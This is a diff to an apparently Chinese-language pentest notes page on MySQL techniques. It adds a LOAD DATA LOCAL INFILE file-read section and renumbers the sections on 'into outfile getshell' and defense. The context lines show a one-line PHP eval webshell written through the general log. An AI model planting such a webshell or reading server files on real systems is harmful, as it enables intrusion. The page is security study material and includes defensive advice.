@@ -111,7 +111,7 @@
  * @Author: reber
  * @Mail: reber0ask@qq.com
  * @Date: 2019-04-10 10:45:00
- * @LastEditTime : 2020-04-29 16:58:30
+ * @LastEditTime : 2020-08-24 00:25:58
  -->
 
 <h3 id="0x00-load-file-读文件">0x00 load_file() 读文件</h3>
@@ -148,7 +148,24 @@
 </ul></li>
 </ul>
 
-<h3 id="0x01-into-outfile-getshell">0x01 into outfile getshell</h3>
+<h3 id="0x01-load-data-local-infile-读文件">0x01 load data local infile 读文件</h3>
+
+<ul>
+<li>条件:</li>
+</ul>
+
+<pre><code>MySQL8 中需要 SET GLOBAL local_infile=1;
+</code></pre>
+
+<ul>
+<li>语句</li>
+</ul>
+
+<pre><code>LOAD DATA LOCAL INFILE 'D:/pet.txt' INTO TABLE pet FIELDS TERMINATED BY '';
+select * from pet;
+</code></pre>
+
+<h3 id="0x02-into-outfile-getshell">0x02 into outfile getshell</h3>
 
 <ul>
 <li>条件：</li>
@@ -207,7 +224,7 @@ select '&lt;?php eval($_GET[g]);?&gt;'             #写入shell
 set global general_log=off;                  #关闭general log模式
 </code></pre>
 
-<h3 id="0x02-防御">0x02 防御</h3>
+<h3 id="0x03-防御">0x03 防御</h3>
 
 <ul>
 <li>数据库连接账号不要用root权限</li>
